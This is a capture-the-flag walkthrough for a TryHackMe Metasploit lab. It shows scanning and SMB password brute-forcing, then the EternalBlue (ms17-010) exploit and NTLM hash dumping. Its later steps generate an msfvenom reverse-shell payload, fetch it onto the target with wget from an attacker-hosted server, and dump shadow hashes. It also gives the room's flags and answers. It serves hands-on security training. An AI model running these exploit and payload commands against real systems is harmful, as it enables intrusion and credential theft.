# TryHackMe: Metasploit: Exploitation - Walkthrough

Room URL: https://tryhackme.com/room/metasploitexploitation




# Task 2: Scanning


**Questions:**


**1- How many ports are open on the target system?**

first start `msfconsole` command to run metasploit framework command-line interface

port scan the target system using `nmap -sV <target ip>` to attempts to determine the version of the service running on port 


![image](https://github.com/user-attachments/assets/28d0cf99-da9e-4092-9711-abe09ac4a60c)

Ans: ***5***

**2-Using the relevant scanner, what NetBIOS name can you see?**

you can search for NETBIOS module using ```search netbios```

then select the relevet module which is ```use auxiliary/scanner/netbios/nbname```

```show options``` then set the required paramters 

However, since we used the Nmap scanner to scan for open ports and determine the version running, we don't need to go through these steps. 

as you can see in the picture above in the version column for the netbios service 

Ans:  ***ACME IT SUPPORT***


**3-What is running on port 8000?**

if you want to use a module for scanning. use this module `use auxiliary/scanner/http/http_version` to scan for http version and set the required parameters.

in the picture above, you can see port 8000 open and the service running at is http with version  webfs/1.21 http 1.21

Ans: ***webfs/1.21***

**4- What is the “penny” user’s SMB password? Use the wordlist mentioned in the previous task.**

`search smb` to search for smb module 

`use  auxiliary/smb/smb_login` The smb_login module is used to bruteforce SMB remotely. SMB credentials are extra valuable because they are system credentials, and you can probably reuse some of them to log in to more machines. If you have a database plugin loaded, successful logins will be stored in it for future reference and usage.

then set the required parameters 

`set rhosts <target ip>`

`set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`

`set SMBUser penny`

`run` 

![image](https://github.com/user-attachments/assets/caf8a9d3-2498-4a45-83ac-5d8af88f482e)
![image](https://github.com/user-attachments/assets/7d3c7f1e-2c68-47d2-b5fb-81892facd412)

Ans: ***leo1234***


# Task 4: Vulnerability Scanning

**Questions:**

**1- Who wrote the module that allows us to check SMTP servers for open relay?**

first search for smtp modules

`search smtp`

![image](https://github.com/user-attachments/assets/2badf6ee-34f8-4863-aefc-b8f1cdb62592)

`use 39` to select smtp_relay module

`info` to show information about this module
![image](https://github.com/user-attachments/assets/d99e8741-00b4-4055-ba37-080023d781e6)

Ans: ***Campbell Murray***


# Task 5: Exploitation

**Questions:**

**1- Exploit one of the critical vulnerabilities on the target VM**

lets look at the previous port scan 

![image](https://github.com/user-attachments/assets/28d0cf99-da9e-4092-9711-abe09ac4a60c)

There are many potential attack vectors. We have ftp running, OpenSSH, Netbios, as well as webfs.

Now we can use a vulnerability scanning module to find potential vulnerabilities. Let’s look at Netbios!

`nmap 10.10.121.21 -p 443 — script smb-os-discovery`

![image](https://www.jalblas.com/wp-content/uploads/2024/11/Running-the-smb-os-discovery-script.png.webp)

We can look for vulnerabilities with the following command:

`nmap 10.10.121.21 -p 139,445 — script vuln`

![image](https://www.jalblas.com/wp-content/uploads/2024/11/Running-the-nmap-vuln-script.png.webp)

We found a vulnerability! A critical remote code execution vulnerability exists in Microsoft SMBv1 (ms17–010). We can search for this exploit by running:

`search ms17–010`

![image](https://www.jalblas.com/wp-content/uploads/2024/11/Searching-for-the-ms17%E2%80%93010-exploit-modules.png.webp)

Let’s try the EnternalBlue exploit (use 2).

set the parameters `set set RHOSTS <ip>` then run the exploit `run`

![image](https://github.com/user-attachments/assets/a70b4ab6-939b-463d-8814-7af184eabd84)

Ans: ***No answer needed***

**2-What is the content of the flag.txt file?**

`search -f flag.txt` to search for the flag.txt file then print its content 
![image](https://github.com/user-attachments/assets/b1a453a6-0050-4a1d-ba50-ff7bcf96ac15)

Ans: ***THM-5455554845***

**3- What is the NTLM hash of the password of the user “pirate”?**

to find the command and run it in the meterpreter run `help` command and you will see `hashdump` command 
![image](https://github.com/user-attachments/assets/ac607f52-b9b5-4161-b076-a8785f4e216b)

![image](https://github.com/user-attachments/assets/6883d93f-e9d4-421e-a05e-a222c49c2a61)

The value we are interested in is the fourth column (8ce9a3ebd1647fcc5e04025019f4b875)

Ans: ***8ce9a3ebd1647fcc5e04025019f4b875***

# Task 6: Msfvenom

**Questions:**

**1-Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type “sudo su” to get a root shell, this will make things easier.**

Ans: ***No answer needed***

**2-Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).**

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacking ip> LPORT=4444 -f elf > shell.elf` 

`-p` payload, `LHOST` listening host, and `-f` for format. then allow executable permissions.

![image](https://github.com/user-attachments/assets/ae4c7a3d-220e-4f8a-9e28-e3a2061dd7a4)

Ans: ***No answer needed***

**3-Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://<ATTACKING_IP>:9000/rev_shell.elf to download it to the target machine).**

after we set the payload and the format of our shell.elf, transfer it to the target machine using this command

`python3 -m http.server 9000` this command will do a simple server to host all the files in the current directory to the internet for anyone to grab it.


Open a new tab, and SSH into the target machine:

`ssh murphy@<target ip>` from question 1

Then download the file to the target machine by running:

`wget http://<attacker machine ip>:9000/shell.elf`

![image](https://github.com/user-attachments/assets/71b9720d-8de7-434e-a8c5-97d31ae88eaa)

Ans: ***No answer needed***


**4- Get a meterpreter session on the target machine.**

after we downloaded the payload into the target machine, we need to set the handler to accept incoming connection generated by the MSFvenom payload

![image](https://github.com/user-attachments/assets/813b6e6d-b2c2-4c63-b708-ed65e01dcd04)

before running the handler, make sure that both the payload downloaded into the target machine which is this `linux/x86/meterpreter/reverse_tcp` match the handle payload 

![image](https://github.com/user-attachments/assets/2486afe5-e022-4a8d-bf7a-66619f2d827c)

once all set `run` handler and wait for the target to execute the file `./shell.elf` 

![image](https://github.com/user-attachments/assets/6869e08b-dee7-44b4-b919-a306563e3b2a)

and we get a meterpreter shell!

Ans: ***No answer needed***

**5-Use a post exploitation module to dump hashes of other users on the system.**

if you want to use the post exploitation module in msfconsole. first background the console by pressing Control+Z. then use this module `use post/linux/gather/hashdump` 
then set the required parameter, it requires a session parameter. use `sessions` command to show the available sessions. the `set session <session id>` to execute this module in that session 
![image](https://www.jalblas.com/wp-content/uploads/2024/11/Configuring-post_linux_gather_hashdump.png.webp)

but you can also use this mothed where you cat the shadow file which will contain which is a password file that Linux use it to stores encrypted user passwords
![image](https://github.com/user-attachments/assets/3a342181-7b41-4636-bc5a-b393e2ce093d)

Ans: ***No answer needed***

**6-What is the other user’s password hash?**

copy Claire's hash value 

Ans: ***$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0***




***reference:***

https://www.youtube.com/watch?v=cb1jCgDaM60

https://www.jalblas.com/blog/tryhackme-metasploit-exploitation-walkthrough/

